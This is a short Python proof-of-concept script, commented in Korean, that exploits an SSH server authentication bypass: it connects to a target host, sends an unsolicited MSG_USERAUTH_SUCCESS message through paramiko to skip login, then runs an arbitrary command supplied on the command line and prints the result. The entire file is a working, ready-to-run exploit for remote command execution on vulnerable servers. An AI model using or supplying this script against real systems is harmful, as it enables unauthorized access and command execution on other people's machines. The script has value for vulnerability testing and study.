#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048


def execute(hostname, port, command):
    sock = socket.socket()
    try:
        # 입력한 호스트 IP, Port 번호로 소켓 연결
        sock.connect((hostname, int(port)))

        # 서버로 보낼 메세지 생성
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        # exploit의 핵심 부분. 메세지에 MSG_USERAUTH_SUCCESS를 추가해서 전송
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        # 입력한 command 실행
        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # 서버에서 실행된 결과를 stdout으로 받아오기
        # stdin = client.makefile("wb", bufsize)
        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        # 결과를 터미널에 출력
        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        return (output+error).decode()

    # SSH 연결 실패 처리
    except paramiko.SSHException as e:
        logging.exception(e)
        logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
    except socket.error:
        logging.debug("Unable to connect.")

    return None


if __name__ == '__main__':
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))
